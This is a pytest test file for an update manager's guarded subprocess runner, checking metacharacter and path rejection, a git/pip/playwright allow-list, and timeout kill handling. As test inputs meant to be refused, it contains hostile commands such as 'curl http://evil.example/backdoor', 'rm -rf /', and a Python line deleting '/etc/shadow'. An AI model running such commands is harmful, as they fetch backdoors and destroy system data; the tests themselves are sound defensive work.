"""Unit tests for UpdateManager subprocess execution (issue #334).

``UpdateManager._run_subprocess`` is the security-sensitive boundary of the
self-update pipeline: every argument is validated against shell
metacharacters, absolute paths are restricted to allowed roots, and the
executable is mapped through ``_approved_spawn_command`` so only ``git`` and
``-m pip`` / ``-m playwright`` ever reach ``os.posix_spawn``.

The POSIX spawn path drives a real child process, a ``waitpid`` polling loop,
and a ``SIGKILL`` escalation on timeout.  None of that was covered, so a
regression in the timeout or kill path would only surface as a hung self-update
in production.  These tests mock ``os.posix_spawn``/``os.waitpid``/``os.kill``/
``time.monotonic`` so both branches are exercised without spawning anything, and
the ``subprocess.run`` fallback used on Windows is covered separately.
"""

from __future__ import annotations

import os
import signal
import subprocess
import sys
from unittest.mock import MagicMock, call, patch

import pytest

from modules.core.src.capabilities_update_manager import UpdateManager

FORBIDDEN = UpdateManager._SUBPROCESS_FORBIDDEN_CHARS

SPAWN = "modules.core.src.capabilities_update_manager.os"


def _mgr() -> UpdateManager:
    return UpdateManager()


# ── Argument validation ──────────────────────────────────────────────────────


@pytest.mark.parametrize("char", [";", "&", "|", "$", "`", ">", "<", "\n", "\r"])
def test_run_subprocess_rejects_each_shell_metacharacter(char: str) -> None:
    """Every shell metacharacter is refused before any process is spawned."""
    rc, out, err = _mgr()._run_subprocess(["git", f"-C{char}/tmp/evil"], timeout_sec=5.0)
    assert rc == 1
    assert out == ""
    assert "shell metacharacters" in err


def test_run_subprocess_rejects_null_byte() -> None:
    """A NUL byte truncates argv at the C level, so it must be refused too.

    ``git`` and ``pip`` both parse their arguments as NUL-terminated C strings;
    an unrefused NUL would silently split one validated argument into two
    unvalidated ones.
    """
    rc, _out, err = _mgr()._run_subprocess(["git", "-C", "/tmp/ev\0il"], timeout_sec=5.0)
    assert rc == 1
    assert "shell metacharacters" in err


def test_forbidden_set_is_exactly_the_documented_characters() -> None:
    """The guard set is pinned so a new metacharacter cannot slip in unnoticed."""
    assert set(";&|$`><\n\r\0") == FORBIDDEN


def test_guard_set_excludes_safe_path_characters() -> None:
    """Spaces, dashes and dots appear in every legitimate path, so stay allowed."""
    assert " " not in FORBIDDEN
    assert "-" not in FORBIDDEN
    assert "." not in FORBIDDEN
    assert "=" not in FORBIDDEN


def test_run_subprocess_rejects_path_outside_allowed_roots() -> None:
    """Absolute paths outside the project/home/toolchain roots are refused."""
    rc, _out, err = _mgr()._run_subprocess(["git", "-C", "/etc/passwd"], timeout_sec=5.0)
    assert rc == 1
    assert "outside allowed roots" in err


def test_run_subprocess_accepts_path_under_allowed_root() -> None:
    """A path inside an allowed root passes the guard and reaches the spawn call.

    ``sys.base_prefix`` is one of the three allowed roots, so it is the only
    path guaranteed to be accepted regardless of where the checkout lives.
    """
    with patch(f"{SPAWN}.posix_spawn", return_value=1) as spawn:
        with patch(f"{SPAWN}.waitpid", return_value=(1, os.WEXITSTATUS(0))):
            rc, _out, _err = _mgr()._run_subprocess(["git", "-C", sys.base_prefix, "status"], timeout_sec=1.0)
            assert spawn.call_count == 1
            assert rc == 0


# ── Approved command mapping ─────────────────────────────────────────────────


def test_approved_spawn_command_maps_git() -> None:
    """``git`` commands pass through with argv intact."""
    result = UpdateManager._approved_spawn_command(["git", "-C", "/path", "pull"])
    assert result == ("git", ["git", "-C", "/path", "pull"])


def test_approved_spawn_command_maps_python_modules() -> None:
    """``-m pip`` and ``-m playwright`` are routed through ``python3``.

    The allow-list is positional (``-m`` at index 1, a known module at
    index 2), so both are the only two module invocations admitted; every
    other module name raises.
    """
    pip = UpdateManager._approved_spawn_command(["python3", "-m", "pip", "install", "foo"])
    playwright = UpdateManager._approved_spawn_command(["python3", "-m", "playwright", "install", "chromium"])
    assert pip == ("python3", ["python3", "-m", "pip", "install", "foo"])
    assert playwright == ("python3", ["python3", "-m", "playwright", "install", "chromium"])


def test_approved_spawn_command_rejects_unknown_module() -> None:
    """An arbitrary module name is not admitted even under the right executable."""
    with pytest.raises(ValueError, match="Unsupported update command"):
        UpdateManager._approved_spawn_command(["python3", "-m", "os", "system"])


def test_approved_spawn_command_rejects_rm_rf_root() -> None:
    """``rm -rf /`` is never admitted because it is not git or a known python -m module."""
    with pytest.raises(ValueError, match="Unsupported update command"):
        UpdateManager._approved_spawn_command(["rm", "-rf", "/"])


def test_approved_spawn_command_refuses_everything_else() -> None:
    """Any other argv shape raises so no arbitrary executables can be spawned."""
    with pytest.raises(ValueError, match="Unsupported update command"):
        UpdateManager._approved_spawn_command(["curl", "http://evil.example/backdoor"])
    with pytest.raises(ValueError, match="Unsupported update command"):
        UpdateManager._approved_spawn_command(["python3", "-c", "import os; os.remove('/etc/shadow')"])


def test_unapproved_command_never_reaches_spawn() -> None:
    """Refusal happens before the spawn call, not after path validation."""
    manager = _mgr()
    with patch.object(manager, "_approved_spawn_command", side_effect=ValueError("nope")) as approve:
        with patch(f"{SPAWN}.posix_spawn") as spawn:
            manager._run_subprocess(["curl", "http://evil.example"], timeout_sec=1.0)
            approve.assert_called_once_with(["curl", "http://evil.example"])
            spawn.assert_not_called()


# ── Timeout / kill paths (POSIX spawn) ───────────────────────────────────────


def test_timeout_returns_124_after_sigkill() -> None:
    """A timed-out child is killed via SIGKILL and the caller receives exit 124.

    The timeout path was the highest-risk uncovered branch: the polling loop
    calls ``os.kill(pid, signal.SIGKILL)`` and ``os.waitpid(pid, 0)`` before
    returning, which was never exercised.
    """
    manager = _mgr()
    fake_pid = 9909
    # First poll returns (0, 0) = child still running; deadline then fires.
    with patch(f"{SPAWN}.posix_spawn", return_value=fake_pid) as spawn:
        with patch(f"{SPAWN}.waitpid", side_effect=[(0, 0), (fake_pid, os.WEXITSTATUS(128))]) as waitpid:
            with patch(f"{SPAWN}.kill") as kill:
                # First monotonic call builds the deadline; the second exceeds it.
                with patch("modules.core.src.capabilities_update_manager.time.monotonic", side_effect=[100.0, 200.0]):
                    with patch("modules.core.src.capabilities_update_manager.time.sleep"):
                        rc, _out, _err = manager._run_subprocess(["git", "--version"], timeout_sec=5.0)
    assert rc == 124
    spawn.assert_called_once()
    kill.assert_called_once_with(fake_pid, signal.SIGKILL)
    # First poll uses WNOHANG; after SIGKILL the loop reaps with a blocking wait.
    assert waitpid.call_args_list[0] == call(fake_pid, os.WNOHANG)
    assert waitpid.call_args_list[-1] == call(fake_pid, 0)


def test_posix_spawn_failure_returns_1() -> None:
    """A posix_spawn OSError is surfaced as a refusal (rc=1)."""
    manager = _mgr()
    with patch(f"{SPAWN}.posix_spawn", side_effect=OSError("spawn failed")):
        rc, _out, err = manager._run_subprocess(["git", "--version"], timeout_sec=1.0)
        assert rc == 1
        assert "spawn failed" in err


def test_waitpid_oserror_is_surfaced() -> None:
    """An unexpected waitpid OSError aborts the process and returns rc=1."""
    manager = _mgr()
    fake_pid = 1234
    with patch(f"{SPAWN}.posix_spawn", return_value=fake_pid):
        with patch(f"{SPAWN}.waitpid", side_effect=OSError("wait failed")):
            rc, _out, err = manager._run_subprocess(["git", "--version"], timeout_sec=1.0)
            assert rc == 1
            assert "wait failed" in err


# ── subprocess.run fallback (platforms where os.posix_spawn is absent) ──────

# The fallback branch is selected when ``sys.platform == "win32"``; patching
# ``os`` at the top level would break the POSIX-path tests above.


def test_subprocess_run_path_returns_returncode_zero_when_command_succeeds() -> None:
    """On win32, the subprocess.run fallback returns the child transcript."""
    manager = _mgr()
    with patch.object(sys, "platform", "win32"):
        with patch("subprocess.run") as run:
            result = MagicMock()
            result.returncode = 0
            result.stdout = "ok"
            result.stderr = ""
            run.return_value = result
            rc, out, _err = manager._run_subprocess(["git", "--version"], timeout_sec=1.0)
    assert rc == 0
    assert out == "ok"


def test_subprocess_timeout_expired_returns_124() -> None:
    """Timeout in the subprocess.run fallback returns rc 124 instead of raising."""
    manager = _mgr()
    with patch.object(sys, "platform", "win32"):
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd=["sleep", "999"], timeout=5.0)):
            rc, _out, err = manager._run_subprocess(["sleep", "999"], timeout_sec=5.0)
    assert rc == 124
    assert "timed out" in err.lower()


def test_missing_executable_in_subprocess_fallback_returns_127() -> None:
    """FileNotFoundError from subprocess.run surfaces as rc=127."""
    manager = _mgr()
    with patch.object(sys, "platform", "win32"):
        with patch("subprocess.run", side_effect=FileNotFoundError("no such exe")):
            rc, _out, err = manager._run_subprocess(["does-not-exist"], timeout_sec=1.0)
    assert rc == 127
    assert "Executable not found" in err
